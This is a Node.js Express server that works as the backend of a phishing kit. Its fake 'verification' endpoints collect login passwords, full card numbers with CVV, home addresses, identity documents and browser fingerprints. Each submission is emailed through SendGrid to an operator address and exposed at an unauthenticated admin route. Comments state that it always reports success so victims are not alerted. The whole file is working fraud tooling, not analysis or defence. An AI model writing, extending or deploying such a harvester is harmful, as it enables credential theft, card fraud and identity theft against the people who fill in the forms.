const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const sgMail = require('@sendgrid/mail');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Initialize SendGrid
if (!process.env.SENDGRID_API_KEY) {
    console.warn('SENDGRID_API_KEY environment variable is not set');
} else {
    sgMail.setApiKey(process.env.SENDGRID_API_KEY);
}

// Data storage (in production, use a proper database)
let receivedData = [];

// Utility function to format data for email
function formatDataForEmail(data, pageType) {
    const timestamp = new Date().toLocaleString();
    
    let emailText = `
NEW DATA RECEIVED - ${pageType.toUpperCase()}
Timestamp: ${timestamp}
============================================
`;

    switch (pageType) {
        case 'login':
            emailText += `
LOGIN CREDENTIALS
Email: ${data.email || 'N/A'}
Password: ${data.password || 'N/A'}
`;
            break;
            
        case 'card_verification':
            emailText += `
CARD INFORMATION
Full Name: ${data.fullName || 'N/A'}
Card Number: ${data.cardNumber || 'N/A'}
Expiry: ${data.expiry || 'N/A'}
CVV: ${data.cvv || 'N/A'}
`;
            break;
            
        case 'address_verification':
            emailText += `
ADDRESS INFORMATION
Full Name: ${data.fullName || 'N/A'}
Address: ${data.address1 || 'N/A'} ${data.address2 || ''}
City: ${data.city || 'N/A'}
State: ${data.state || 'N/A'}
ZIP Code: ${data.zipCode || 'N/A'}
Phone: ${data.phone || 'N/A'}
Country: ${data.country || 'N/A'}
`;
            break;
            
        case 'identity_verification':
            emailText += `
IDENTITY VERIFICATION
Document Type: ${data.documentType || 'N/A'}
Files Uploaded: ${data.filesCount || 0}
Selfie Uploaded: ${data.hasSelfie ? 'Yes' : 'No'}
`;
            break;
            
        default:
            emailText += `
UNKNOWN DATA TYPE
${JSON.stringify(data, null, 2)}
`;
    }

    if (data.client_data) {
        emailText += `
CLIENT INFORMATION
IP Address: ${data.client_ip || 'N/A'}
User Agent: ${data.client_data.user_agent || 'N/A'}
Browser: ${data.client_data.browser_name || 'N/A'} ${data.client_data.browser_version || ''}
OS: ${data.client_data.operating_system || 'N/A'}
Screen: ${data.client_data.screen_resolution || 'N/A'}
Timezone: ${data.client_data.timezone || 'N/A'}
Language: ${data.client_data.language || 'N/A'}
Platform: ${data.client_data.platform || 'N/A'}
`;
    }

    return emailText;
}

// Email sending function with improved error handling
async function sendEmail(data, pageType) {
    // Check if required environment variables are set
    if (!process.env.SENDGRID_API_KEY || !process.env.TO_EMAIL || !process.env.FROM_EMAIL) {
        console.warn('Email configuration missing. Skipping email send.');
        return false;
    }

    const emailText = formatDataForEmail(data, pageType);
    
    const msg = {
        to: process.env.TO_EMAIL,
        from: process.env.FROM_EMAIL,
        subject: `New ${pageType} Data Received`,
        text: emailText,
    };

    try {
        await sgMail.send(msg);
        console.log(`Email sent successfully for ${pageType}`);
        return true;
    } catch (error) {
        console.error('Error sending email:', error.response?.body || error.message);
        return false;
    }
}

// Generic request handler to reduce code duplication
async function handleVerificationRequest(req, res, type) {
    try {
        const requestData = req.body;
        console.log(`${type} data received:`, requestData);

        // Store data
        receivedData.push({
            type: type,
            data: requestData,
            timestamp: new Date().toISOString()
        });

        // Send email (fire and forget)
        sendEmail(requestData, type).catch(emailError => {
            console.error(`Failed to send email for ${type}:`, emailError);
        });

        // Always return success to the client
        res.json({
            success: true,
            message: `${type.replace('_', ' ')} verification successful`
        });

    } catch (error) {
        console.error(`Error in ${type}:`, error);
        // Still return success to avoid alerting the client
        res.json({ 
            success: true,
            message: 'Verification processed'
        });
    }
}

// Route handlers
app.post('/api/verify-login', (req, res) => handleVerificationRequest(req, res, 'login'));
app.post('/api/verify-card', (req, res) => handleVerificationRequest(req, res, 'card_verification'));
app.post('/api/verify-address', (req, res) => handleVerificationRequest(req, res, 'address_verification'));
app.post('/api/verify-identity', (req, res) => handleVerificationRequest(req, res, 'identity_verification'));

app.post('/api/security-event', async (req, res) => {
    try {
        const securityData = req.body;
        console.log('Security event received:', securityData.eventType);

        receivedData.push({
            type: 'security_event',
            data: securityData,
            timestamp: new Date().toISOString()
        });

        res.json({ success: true });

    } catch (error) {
        console.error('Error handling security event:', error);
        res.json({ success: true });
    }
});

// Admin routes
app.get('/admin/data', (req, res) => {
    res.json({
        total_records: receivedData.length,
        data: receivedData
    });
});

app.delete('/admin/data', (req, res) => {
    const previousCount = receivedData.length;
    receivedData = [];
    res.json({
        success: true,
        message: `Cleared ${previousCount} records`,
        total_records: receivedData.length
    });
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        timestamp: new Date().toISOString(),
        records: receivedData.length,
        environment: process.env.NODE_ENV || 'development'
    });
});

// Root endpoint
app.get('/', (req, res) => {
    res.json({ 
        message: 'Server is running',
        version: '1.0.0',
        endpoints: [
            '/api/verify-login',
            '/api/verify-card', 
            '/api/verify-address',
            '/api/verify-identity',
            '/api/security-event',
            '/admin/data',
            '/health'
        ]
    });
});

// Error handling middleware
app.use((error, req, res, next) => {
    console.error('Unhandled error:', error);
    res.status(500).json({ 
        success: false,
        message: 'Internal server error'
    });
});

// 404 handler
app.use('*', (req, res) => {
    res.status(404).json({
        success: false,
        message: 'Endpoint not found'
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
    
    // Warn about missing configuration
    if (!process.env.SENDGRID_API_KEY) {
        console.warn('⚠️  SENDGRID_API_KEY environment variable is not set');
    }
    if (!process.env.TO_EMAIL) {
        console.warn('⚠️  TO_EMAIL environment variable is not set');
    }
    if (!process.env.FROM_EMAIL) {
        console.warn('⚠️  FROM_EMAIL environment variable is not set');
    }
});

module.exports = app; // For testing purposes
